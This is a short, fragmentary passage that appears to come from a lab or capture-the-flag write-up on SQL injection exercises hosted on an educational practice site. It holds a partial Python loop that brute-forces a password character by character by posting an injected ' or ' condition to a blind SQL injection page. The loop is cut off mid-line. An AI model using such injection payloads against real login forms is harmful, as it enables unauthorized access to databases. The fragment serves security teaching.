...
https://primer.cylabacademy.org/vuln/web/basicsql.php[https://primer.cylabacademy.org/vuln/web/basicsql.php, window="_blank"]
...
https://primer.cylabacademy.org/vuln/web/blindsql.php[https://primer.cylabacademy.org/vuln/web/blindsql.php, window="_blank"]
...
for i in range(40):
  for letter in printable:
    ...
    r = requests.post("https://primer.cylabacademy.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
